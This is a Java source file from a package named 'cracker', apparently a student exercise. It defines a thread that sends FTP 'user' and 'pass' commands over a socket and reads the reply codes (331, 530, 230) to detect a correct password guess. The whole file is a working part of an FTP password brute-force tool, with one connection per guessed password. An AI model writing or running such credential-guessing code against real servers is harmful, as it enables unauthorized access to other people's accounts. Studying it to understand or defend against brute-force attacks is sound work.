/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package cracker;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author dam2
 */
public class Escribir extends Thread {

    Socket socket;
    LinkedList<String> mensajes;
    String usuario;
    String pass;
    boolean cierre = false;
    String mensaje = "";
    
    int id = 0;
    Escribir() {

    }

    Escribir(Socket socket, LinkedList<String> mensajes, String usuario, String pass) {
        this.socket = socket;
        this.mensajes = mensajes;
        this.usuario = usuario;
        this.pass = pass;
    }

    //Tengo que cerrar cada conexion con cada intento de contraseña por cada usuario
    public void run(){
        String respuesta = "";
        try{
      
            try {

                while (mensajes.size() > 0) {
                    respuesta = mensajes.pop();
                    System.out.println(respuesta);
                }
                PrintWriter escribir = new PrintWriter(socket.getOutputStream());

                if (mensajes.size() <= 0) {
                    escribir.println("user " + usuario);
                    System.out.println("usuario " + usuario);
                    escribir.flush();
                    
                    System.out.println(mensajes);
                    
                    while (mensajes.isEmpty()) {
                        Thread.sleep(10);
                    }
                    
                    System.out.println("despues sleep " + id + " " + mensajes);
                    
                    mensaje = mensajes.pop();
                    if (mensaje.contains("331")) {
                        System.out.println("usuario 2 " + usuario);
                        escribir.println("pass " + pass);
                        escribir.flush();

                    }

                    while (mensajes.isEmpty()) {
                        Thread.sleep(50);
                    }

                    mensaje = mensajes.pop();
                    System.out.println("prueba " + id + " "+ mensaje);
                    if (mensaje.contains("530")) {
                        if(mensaje.contains("failed")){
                            System.out.println("entro 530 failed " + id );
                            socket.close();
                        }else{
                            System.out.println("El password se ha acertado: Has entrado");
                            cierre = true;
                            socket.close();
                        }
                        
                    } else if (mensaje.contains("230")) {
                        System.out.println("El password se ha acertado: Has entrado");
                            cierre = true;
                            socket.close();
                    }
                }
            } catch (IOException ex) {
                Logger.getLogger(Escribir.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(Escribir.class.getName()).log(Level.SEVERE, null, ex);
            }
        id++;
        }catch(Exception e){
                e.getStackTrace();
        }

    }
}
